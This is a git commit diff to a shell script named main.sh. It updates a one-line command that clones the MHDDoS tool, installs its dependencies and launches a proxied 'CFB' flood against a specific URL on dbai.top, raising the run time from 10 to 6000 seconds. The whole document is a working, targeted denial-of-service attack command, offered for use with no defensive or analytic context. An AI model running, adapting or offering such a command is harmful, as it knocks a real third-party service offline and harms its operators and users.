474c4857ee9f0fae4a21f6f1dcd403dac106e3ab
Nayuki Pro <91455547+Nayuki-Pro@users.noreply.github.com>
2022-04-15 15:57:33 +0800

    Update main.sh

--- main.sh
+++ main.sh
@@ -1,1 +1,1 @@
-rm -rf MHDDoS&&git clone https://github.com/MatrixTM/MHDDoS&&cd MHDDoS&&pip3 install -r requirements.txt&&python3 start.py CFB  'https://dbai.top/api/v1/client/subscribe'  5  400 socks5.txt  100 10
+rm -rf MHDDoS&&git clone https://github.com/MatrixTM/MHDDoS&&cd MHDDoS&&pip3 install -r requirements.txt&&python3 start.py CFB  'https://dbai.top/api/v1/client/subscribe'  5  400 socks5.txt  100 6000
